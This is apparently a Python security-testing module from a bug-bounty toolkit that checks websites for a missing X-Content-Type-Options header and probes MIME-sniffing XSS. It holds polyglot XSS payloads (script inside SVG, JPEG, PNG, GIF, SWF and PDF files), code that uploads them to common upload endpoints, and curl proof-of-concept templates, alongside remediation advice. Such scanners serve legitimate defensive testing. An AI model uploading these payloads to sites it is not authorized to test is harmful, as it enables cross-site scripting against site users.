"""
X-Content-Type-Options Security Tester Agent

Advanced security testing agent that identifies missing or misconfigured X-Content-Type-Options
headers and tests for MIME sniffing vulnerabilities that can lead to XSS attacks.

This agent tests for:
- Missing X-Content-Type-Options: nosniff header
- MIME sniffing vulnerabilities via content-type confusion
- XSS via polyglot file uploads
- Content-Type mismatch exploitation
- SVG/HTML polyglot attacks
- JavaScript disguised as images
- CSS-based XSS via MIME sniffing
- Flash/PDF polyglot attacks

Author: BountyHound Team
Version: 1.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import re
import json
import base64
import mimetypes
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field, asdict
from datetime import date
from enum import Enum
from io import BytesIO


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


class MimeSniffSeverity(Enum):
    """MIME sniffing vulnerability severity levels."""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class MimeSniffVulnType(Enum):
    """Types of MIME sniffing vulnerabilities."""
    MISSING_NOSNIFF = "MISSING_X_CONTENT_TYPE_OPTIONS"
    MIME_TYPE_CONFUSION = "MIME_TYPE_CONFUSION"
    POLYGLOT_XSS = "POLYGLOT_XSS"
    SVG_UPLOAD_XSS = "SVG_UPLOAD_XSS"
    HTML_IN_IMAGE = "HTML_IN_IMAGE"
    JS_IN_IMAGE = "JS_IN_IMAGE"
    CSS_INJECTION = "CSS_INJECTION"
    FLASH_POLYGLOT = "FLASH_POLYGLOT"
    PDF_XSS = "PDF_XSS"
    CONTENT_TYPE_OVERRIDE = "CONTENT_TYPE_OVERRIDE"


@dataclass
class MimeSniffFinding:
    """Represents a MIME sniffing security finding."""
    title: str
    severity: MimeSniffSeverity
    vuln_type: MimeSniffVulnType
    description: str
    endpoint: str
    content_type: Optional[str] = None
    has_nosniff: bool = False
    response_headers: Dict[str, str] = field(default_factory=dict)
    poc: str = ""
    impact: str = ""
    recommendation: str = ""
    cwe_id: Optional[str] = None
    discovered_date: str = field(default_factory=lambda: date.today().isoformat())
    payload: Optional[str] = None
    file_extension: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary with enum handling."""
        data = asdict(self)
        data['severity'] = self.severity.value
        data['vuln_type'] = self.vuln_type.value
        return data


@dataclass
class MimeSniffTestResult:
    """Result from a MIME sniffing test."""
    endpoint: str
    has_nosniff: bool
    content_type: Optional[str] = None
    x_content_type_options: Optional[str] = None
    allows_upload: bool = False
    accepts_extensions: List[str] = field(default_factory=list)
    is_vulnerable: bool = False
    vulnerability_type: Optional[MimeSniffVulnType] = None
    details: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert test result to dictionary."""
        data = asdict(self)
        if self.vulnerability_type:
            data['vulnerability_type'] = self.vulnerability_type.value
        return data


class XContentTypeOptionsTester:
    """
    Advanced X-Content-Type-Options Security Tester.

    Tests for missing nosniff header and MIME sniffing vulnerabilities including:
    - Basic header presence checks
    - Content-Type confusion attacks
    - Polyglot file upload exploitation
    - XSS via MIME sniffing

    Usage:
        tester = XContentTypeOptionsTester(target_url="https://example.com")
        findings = tester.run_all_tests()
    """

    # Polyglot payloads for various file types
    POLYGLOT_PAYLOADS = {
        'svg_xss': {
            'content': '''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <script type="text/javascript">
        alert(document.domain)
    </script>
    <text x="10" y="20">Test Image</text>
</svg>''',
            'content_type': 'image/svg+xml',
            'extension': '.svg'
        },
        'html_in_jpg': {
            'content': b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00<script>alert(document.domain)</script><!-- ',
            'content_type': 'image/jpeg',
            'extension': '.jpg'
        },
        'js_in_png': {
            'content': b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89alert(1);//',
            'content_type': 'image/png',
            'extension': '.png'
        },
        'html_gif': {
            'content': b'GIF89a/*<script>alert(document.domain)</script>*/',
            'content_type': 'image/gif',
            'extension': '.gif'
        },
        'css_import': {
            'content': '''body { background: url('x'); }
</style><script>alert(document.domain)</script><style>''',
            'content_type': 'text/css',
            'extension': '.css'
        },
        'flash_xss': {
            'content': b'CWS\x09\x00\x00\x00x\x9c\xe3\x02\x00\x00\x04\x00\x01getURL("javascript:alert(1)");',
            'content_type': 'application/x-shockwave-flash',
            'extension': '.swf'
        },
        'pdf_xss': {
            'content': b'%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj 2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj 3 0 obj<</Type/Page/Parent 2 0 R/AA<</O<</S/JavaScript/JS(app.alert(1))>>>>>>endobj xref 0 4 trailer<</Root 1 0 R>>%%EOF',
            'content_type': 'application/pdf',
            'extension': '.pdf'
        },
        'html_text': {
            'content': '<html><body><script>alert(document.domain)</script></body></html>',
            'content_type': 'text/plain',
            'extension': '.txt'
        }
    }

    # Common upload endpoints
    UPLOAD_ENDPOINTS = [
        '/upload',
        '/api/upload',
        '/files/upload',
        '/media/upload',
        '/avatar/upload',
        '/profile/upload',
        '/documents/upload',
        '/image/upload',
        '/api/files',
        '/api/v1/upload'
    ]

    def __init__(self, target_url: str, timeout: int = 10,
                 verify_ssl: bool = True,
                 test_upload_endpoints: bool = True):
        """
        Initialize the X-Content-Type-Options Tester.

        Args:
            target_url: Target application URL
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
            test_upload_endpoints: Whether to test upload functionality
        """
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests library is required. Install with: pip install requests")

        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.test_upload_endpoints = test_upload_endpoints
        self.findings: List[MimeSniffFinding] = []
        self.test_results: List[MimeSniffTestResult] = []

        # Set up session
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def _make_request(self, url: str, method: str = "GET",
                     headers: Optional[Dict[str, str]] = None,
                     data: Any = None,
                     files: Optional[Dict[str, Any]] = None) -> Optional[requests.Response]:
        """
        Make HTTP request with error handling.

        Args:
            url: Target URL
            method: HTTP method
            headers: Additional headers
            data: Request body data
            files: Files for multipart upload

        Returns:
            Response object or None if request failed
        """
        try:
            response = self.session.request(
                method=method,
                url=url,
                headers=headers,
                data=data,
                files=files,
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=True
            )
            return response

        except requests.exceptions.RequestException:
            return None

    def test_missing_nosniff_header(self) -> List[MimeSniffFinding]:
        """
        Test if X-Content-Type-Options: nosniff header is missing.

        This is the most basic and common vulnerability.
        """
        findings = []

        response = self._make_request(self.target_url)
        if not response:
            return findings

        xcto = response.headers.get('X-Content-Type-Options', '').lower()
        content_type = response.headers.get('Content-Type', '')

        result = MimeSniffTestResult(
            endpoint=self.target_url,
            has_nosniff=xcto == 'nosniff',
            content_type=content_type,
            x_content_type_options=xcto or None,
            details={'status_code': response.status_code, 'all_headers': dict(response.headers)}
        )

        if xcto != 'nosniff':
            # Determine severity based on content type
            severity = self._assess_nosniff_severity(content_type, response)

            finding = MimeSniffFinding(
                title="Missing X-Content-Type-Options: nosniff Header",
                severity=severity,
                vuln_type=MimeSniffVulnType.MISSING_NOSNIFF,
                description=(
                    f"The endpoint does not set the X-Content-Type-Options: nosniff header. "
                    f"Current Content-Type: {content_type or 'not set'}. "
                    f"This allows browsers to MIME-sniff responses, potentially executing "
                    f"malicious content with an incorrect MIME type."
                ),
                endpoint=self.target_url,
                content_type=content_type,
                has_nosniff=False,
                response_headers=dict(response.headers),
                poc=self._generate_nosniff_poc(),
                impact=(
                    "Without nosniff, browsers may:\n"
                    "1. Execute HTML/JavaScript from files served with wrong Content-Type\n"
                    "2. Render uploaded 'images' as HTML if they contain HTML tags\n"
                    "3. Execute scripts from JSON/text responses\n"
                    "4. Allow XSS via polyglot files (SVG, PDF, etc.)\n\n"
                    "This is especially dangerous if the application allows file uploads."
                ),
                recommendation=(
                    "Add the following header to all responses:\n"
                    "X-Content-Type-Options: nosniff\n\n"
                    "Web Server Configuration:\n"
                    "- Apache: Header always set X-Content-Type-Options \"nosniff\"\n"
                    "- Nginx: add_header X-Content-Type-Options \"nosniff\" always;\n"
                    "- Express.js: Use helmet middleware\n"
                    "- Django: Add to SECURE_CONTENT_TYPE_NOSNIFF = True"
                ),
                cwe_id="CWE-79"
            )
            findings.append(finding)
            result.is_vulnerable = True
            result.vulnerability_type = MimeSniffVulnType.MISSING_NOSNIFF

        self.test_results.append(result)
        return findings

    def _assess_nosniff_severity(self, content_type: str, response: requests.Response) -> MimeSniffSeverity:
        """
        Assess the severity of missing nosniff based on context.

        Args:
            content_type: Content-Type header value
            response: Response object

        Returns:
            Severity level
        """
        # Check if response contains script tags or suspicious content
        content_lower = response.text.lower() if response.text else ""

        # HIGH severity conditions
        if any(keyword in content_lower for keyword in ['<script', 'javascript:', 'onerror=', 'onload=']):
            return MimeSniffSeverity.HIGH

        # Check for dangerous content types
        dangerous_types = ['application/json', 'text/plain', 'text/csv', 'application/octet-stream']
        if any(ct in content_type.lower() for ct in dangerous_types):
            return MimeSniffSeverity.HIGH

        # Check for upload indicators
        if any(keyword in self.target_url.lower() for keyword in ['upload', 'file', 'media', 'avatar', 'image']):
            return MimeSniffSeverity.HIGH

        # MEDIUM severity for most other cases
        return MimeSniffSeverity.MEDIUM

    def test_polyglot_upload_xss(self) -> List[MimeSniffFinding]:
        """
        Test for XSS via polyglot file uploads.

        Attempts to upload polyglot files that are valid as multiple file types
        and can execute JavaScript if MIME sniffing occurs.
        """
        findings = []

        if not self.test_upload_endpoints:
            return findings

        # Test common upload endpoints
        for endpoint_path in self.UPLOAD_ENDPOINTS:
            upload_url = f"{self.target_url}{endpoint_path}"

            # Test each polyglot payload
            for payload_name, payload_data in self.POLYGLOT_PAYLOADS.items():
                finding = self._test_polyglot_payload(upload_url, payload_name, payload_data)
                if finding:
                    findings.append(finding)
                    break  # Found vulnerability, no need to test more payloads on this endpoint

            # If we found a vulnerability, no need to test more endpoints
            if findings:
                break

        return findings

    def _test_polyglot_payload(self, url: str, payload_name: str,
                               payload_data: Dict[str, Any]) -> Optional[MimeSniffFinding]:
        """
        Test a specific polyglot payload on an upload endpoint.

        Args:
            url: Upload endpoint URL
            payload_name: Name of the payload
            payload_data: Payload data dictionary

        Returns:
            Finding if vulnerability detected, None otherwise
        """
        content = payload_data['content']
        if isinstance(content, str):
            content = content.encode('utf-8')

        extension = payload_data['extension']
        filename = f"test{extension}"

        # Try to upload the file
        files = {'file': (filename, BytesIO(content), payload_data['content_type'])}

        response = self._make_request(url, method="POST", files=files)

        if not response or response.status_code >= 400:
            return None

        # Check if upload succeeded
        if response.status_code in [200, 201, 202]:
            # Check if nosniff is present
            xcto = response.headers.get('X-Content-Type-Options', '').lower()

            if xcto != 'nosniff':
                # Try to extract uploaded file URL from response
                uploaded_url = self._extract_uploaded_url(response, url)

                severity = MimeSniffSeverity.CRITICAL if 'xss' in payload_name.lower() else MimeSniffSeverity.HIGH

                return MimeSniffFinding(
                    title=f"Polyglot XSS via {payload_name} Upload",
                    severity=severity,
                    vuln_type=self._get_vuln_type_for_payload(payload_name),
                    description=(
                        f"The application accepts polyglot file uploads ({payload_name}) and does not "
                        f"set X-Content-Type-Options: nosniff. Uploaded file at: {uploaded_url or 'URL not found'}. "
                        f"Browsers may MIME-sniff the content and execute embedded JavaScript."
                    ),
                    endpoint=url,
                    content_type=payload_data['content_type'],
                    has_nosniff=False,
                    response_headers=dict(response.headers),
                    poc=self._generate_polyglot_poc(payload_name, payload_data, url),
                    impact=(
                        f"An attacker can upload a {extension} file that appears to be a valid "
                        f"{payload_data['content_type']} file but contains malicious JavaScript. "
                        f"When victims view the uploaded file, their browsers may MIME-sniff the content "
                        f"and execute the JavaScript, leading to XSS attacks and potential account takeover."
                    ),
                    recommendation=(
                        "1. Set X-Content-Type-Options: nosniff on all responses\n"
                        "2. Validate uploaded file content, not just extensions\n"
                        "3. Strip metadata and re-encode uploaded files\n"
                        "4. Serve user-uploaded content from a separate domain with restrictive CSP\n"
                        "5. For images: re-encode using ImageMagick or similar\n"
                        "6. Block SVG uploads or sanitize with DOMPurify"
                    ),
                    cwe_id="CWE-79",
                    payload=payload_name,
                    file_extension=extension
                )

        return None

    def _get_vuln_type_for_payload(self, payload_name: str) -> MimeSniffVulnType:
        """Map payload name to vulnerability type."""
        type_mapping = {
            'svg_xss': MimeSniffVulnType.SVG_UPLOAD_XSS,
            'html_in_jpg': MimeSniffVulnType.HTML_IN_IMAGE,
            'js_in_png': MimeSniffVulnType.JS_IN_IMAGE,
            'html_gif': MimeSniffVulnType.HTML_IN_IMAGE,
            'css_import': MimeSniffVulnType.CSS_INJECTION,
            'flash_xss': MimeSniffVulnType.FLASH_POLYGLOT,
            'pdf_xss': MimeSniffVulnType.PDF_XSS,
            'html_text': MimeSniffVulnType.MIME_TYPE_CONFUSION
        }
        return type_mapping.get(payload_name, MimeSniffVulnType.POLYGLOT_XSS)

    def _extract_uploaded_url(self, response: requests.Response, upload_url: str) -> Optional[str]:
        """
        Try to extract uploaded file URL from response.

        Args:
            response: Upload response
            upload_url: Original upload URL

        Returns:
            Uploaded file URL or None
        """
        # Try JSON response
        try:
            data = response.json()
            # Common JSON keys for file URLs
            for key in ['url', 'file_url', 'path', 'file_path', 'location', 'link', 'file']:
                if key in data:
                    return data[key]
        except (ValueError, TypeError):
            pass

        # Try to find URL in HTML response
        if 'text/html' in response.headers.get('Content-Type', ''):
            # Look for common URL patterns
            url_pattern = r'https?://[^\s<>"]+\.(jpg|png|gif|svg|pdf|txt|swf|css)'
            matches = re.findall(url_pattern, response.text, re.IGNORECASE)
            if matches:
                return matches[0][0]  # Return first URL found

        return None

    def test_content_type_override(self) -> List[MimeSniffFinding]:
        """
        Test if server respects Content-Type header or allows override.

        Some servers may accept Content-Type in requests that override server's
        intended MIME type handling.
        """
        findings = []

        # Test with malicious Content-Type
        test_payloads = [
            ('text/html', '<script>alert(1)</script>'),
            ('application/javascript', 'alert(document.domain)'),
            ('text/xml', '<?xml version="1.0"?><root><script>alert(1)</script></root>')
        ]

        for content_type, payload in test_payloads:
            headers = {'Content-Type': content_type}
            response = self._make_request(
                self.target_url,
                method="POST",
                headers=headers,
                data=payload
            )

            if response and response.status_code < 400:
                xcto = response.headers.get('X-Content-Type-Options', '').lower()

                if xcto != 'nosniff':
                    finding = MimeSniffFinding(
                        title=f"Content-Type Override Without nosniff ({content_type})",
                        severity=MimeSniffSeverity.MEDIUM,
                        vuln_type=MimeSniffVulnType.CONTENT_TYPE_OVERRIDE,
                        description=(
                            f"The endpoint accepts POST requests with Content-Type: {content_type} "
                            f"and does not set X-Content-Type-Options: nosniff. This may allow "
                            f"attackers to force MIME type confusion attacks."
                        ),
                        endpoint=self.target_url,
                        content_type=content_type,
                        has_nosniff=False,
                        response_headers=dict(response.headers),
                        poc=self._generate_content_type_override_poc(content_type, payload),
                        impact=(
                            "An attacker may be able to send requests with manipulated Content-Type "
                            "headers that cause the browser to misinterpret responses, potentially "
                            "leading to XSS or other injection attacks."
                        ),
                        recommendation=(
                            "1. Set X-Content-Type-Options: nosniff\n"
                            "2. Validate and sanitize all user-provided Content-Type headers\n"
                            "3. Use a strict Content-Type whitelist\n"
                            "4. Implement proper input validation"
                        ),
                        cwe_id="CWE-79",
                        payload=payload
                    )
                    findings.append(finding)
                    break  # Found one, that's enough

        return findings

    def run_all_tests(self) -> List[MimeSniffFinding]:
        """
        Run all X-Content-Type-Options security tests.

        Returns:
            List of all findings discovered
        """
        all_findings = []

        # Test 1: Basic nosniff header check
        findings = self.test_missing_nosniff_header()
        all_findings.extend(findings)
        self.findings.extend(findings)

        # Test 2: Polyglot upload XSS (only if nosniff is missing)
        if findings:  # Only test uploads if nosniff is missing
            findings = self.test_polyglot_upload_xss()
            all_findings.extend(findings)
            self.findings.extend(findings)

        # Test 3: Content-Type override
        findings = self.test_content_type_override()
        all_findings.extend(findings)
        self.findings.extend(findings)

        return all_findings

    def get_findings_by_severity(self, severity: MimeSniffSeverity) -> List[MimeSniffFinding]:
        """Get findings filtered by severity level."""
        return [f for f in self.findings if f.severity == severity]

    def get_critical_findings(self) -> List[MimeSniffFinding]:
        """Get all critical severity findings."""
        return self.get_findings_by_severity(MimeSniffSeverity.CRITICAL)

    def get_summary(self) -> Dict[str, Any]:
        """
        Generate summary of test results.

        Returns:
            Dictionary with test statistics and findings
        """
        severity_counts = {
            'CRITICAL': len(self.get_findings_by_severity(MimeSniffSeverity.CRITICAL)),
            'HIGH': len(self.get_findings_by_severity(MimeSniffSeverity.HIGH)),
            'MEDIUM': len(self.get_findings_by_severity(MimeSniffSeverity.MEDIUM)),
            'LOW': len(self.get_findings_by_severity(MimeSniffSeverity.LOW)),
            'INFO': len(self.get_findings_by_severity(MimeSniffSeverity.INFO))
        }

        return {
            'target': self.target_url,
            'total_tests': len(self.test_results),
            'total_findings': len(self.findings),
            'severity_breakdown': severity_counts,
            'vulnerable': len(self.findings) > 0,
            'findings': [f.to_dict() for f in self.findings]
        }

    # POC Generation Methods

    def _generate_nosniff_poc(self) -> str:
        """Generate POC for missing nosniff header."""
        return f"""# Check for missing X-Content-Type-Options header
curl -I '{self.target_url}' | grep -i "X-Content-Type-Options"

# If header is missing or not set to 'nosniff', application is vulnerable

# Test MIME sniffing with polyglot file:
# 1. Create file with mixed content (e.g., HTML in image)
# 2. Upload to application
# 3. Access uploaded file URL in browser
# 4. Browser may execute JavaScript despite incorrect Content-Type"""

    def _generate_polyglot_poc(self, payload_name: str,
                              payload_data: Dict[str, Any], url: str) -> str:
        """Generate POC for polyglot upload attack."""
        return f"""# Polyglot {payload_name} Upload POC

# Step 1: Create polyglot file
cat > test{payload_data['extension']} << 'EOF'
{payload_data['content'][:200] if isinstance(payload_data['content'], (str, bytes)) else '[binary data]'}...
EOF

# Step 2: Upload file
curl -X POST '{url}' \\
  -F 'file=@test{payload_data['extension']}' \\
  -v

# Step 3: Note the uploaded file URL from response

# Step 4: Visit uploaded file URL in browser
# Without X-Content-Type-Options: nosniff, browser may:
# - MIME-sniff the content
# - Execute embedded JavaScript
# - Result in XSS attack

# Expected: JavaScript alert() executes
# Browser interprets file as HTML/SVG despite MIME type"""

    def _generate_content_type_override_poc(self, content_type: str, payload: str) -> str:
        """Generate POC for Content-Type override attack."""
        return f"""# Content-Type Override POC

curl -X POST '{self.target_url}' \\
  -H 'Content-Type: {content_type}' \\
  -d '{payload}' \\
  -v

# Check response headers:
# - Should include: X-Content-Type-Options: nosniff
# - If missing, MIME sniffing is possible

# Attack scenario:
# 1. Send POST with malicious Content-Type
# 2. Include JavaScript payload
# 3. Browser MIME-sniffs response
# 4. Executes JavaScript despite incorrect type"""
